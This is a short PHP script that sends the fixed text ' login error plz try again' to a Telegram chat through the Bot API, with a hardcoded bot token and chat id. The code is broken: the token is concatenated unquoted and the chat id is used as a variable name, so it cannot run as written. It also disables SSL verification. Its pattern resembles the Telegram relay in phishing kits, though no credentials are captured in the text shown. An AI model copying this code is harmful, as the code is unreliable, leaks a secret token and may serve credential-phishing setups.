<?php
  $botToken="<7254805352:AAECV0vrMuEcXgirTm49neYHcpgvGmHpJVA>";

  $website="https://api.telegram.org/bot".7254805352:AAECV0vrMuEcXgirTm49neYHcpgvGmHpJVA;
  $chatId=7094580894; //Receiver Chat Id
  $params=[
      'chat_id'=>$7094580894,
      'text'=>' login error plz try again',
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
?>
